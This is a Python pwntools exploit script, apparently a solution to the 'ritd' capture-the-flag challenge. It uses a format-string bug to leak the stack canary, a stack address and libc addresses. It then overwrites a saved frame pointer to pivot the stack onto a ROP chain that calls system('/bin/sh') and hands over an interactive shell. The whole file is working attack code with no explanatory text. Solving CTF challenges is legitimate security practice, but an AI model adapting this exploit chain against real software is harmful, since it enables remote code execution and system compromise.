#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./ritd_patched", checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ritd.ctf.intigriti.io 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

GET_TIMESTAMP = 1
ECHO = 2
READ_IN_THE_DARK = 3
ADMIN_READ = 4


def get_timestamp():
    payload = f"|a|{GET_TIMESTAMP}|b|".encode()
    io.sendlineafter(b"> ", payload)
    io.recvline()
    return int(io.recvline())


def printf_leak(offset, data=b""):
    payload = b""
    payload += b"|a|"
    payload += f"{GET_TIMESTAMP}%{offset}$llx".encode()
    payload += b"||\x00"
    payload = payload.ljust(0x18, b"\x00")
    payload += data
    io.sendlineafter(b"> ", payload)
    io.recvuntil(b"Function: 1")
    leak = int(io.recvline().strip().split(b"-")[0], 16)
    return leak


io = start()

# for i in range(1, 128):
#     leak = printf_leak(i, data=p64(0xcafebabedeadbeef))
#     log.info(f"{i} {leak:#x}")

control_offset = 100

canary_leak_offset = 75
canary = printf_leak(canary_leak_offset)
log.info(f"{canary=:#x}")

stack_leak_offset = 7
stack_leak = printf_leak(stack_leak_offset)
saved_rbp = stack_leak - 0x3a0 + 0x8  # buffered_vfprintf saved rbp address
pivot_addr = stack_leak + 0x78
log.info(f"{saved_rbp=:#x}")
log.info(f"{pivot_addr=:#x}")

libc_leak_offset = 3
libc_leak = printf_leak(libc_leak_offset) - 0x17
libc.address = libc_leak - libc.sym["write"]
log.info(f"{libc.address=:#x}")
pop_rdi = libc.address + 0x001bc021
ret = pop_rdi + 1
str_bin_sh = next(libc.search(b"/bin/sh\x00"))

ropchain = flat(
    canary, 0,
    pop_rdi, str_bin_sh,
    libc.sym['system']
)

# Overwrite buffered_vfprintf saved rbp to pivot to our ropchain
to_pivot = (pivot_addr) & 0xffff
fmt, fmt_data = fmtstr_split(offset=control_offset,
                             writes={saved_rbp: p16(to_pivot)},
                             numbwritten=1)  # 1 because of GET_TIMESTAMP is 1 byte  # noqa
payload = b""
payload += b"|a|"
payload += f"{GET_TIMESTAMP}".encode()
payload += fmt
payload += b"||\x00"
payload = payload.ljust(0x60, b"\x00")
payload += fmt_data
print(payload)
payload += ropchain
io.sendlineafter(b"> ", payload)
io.interactive()
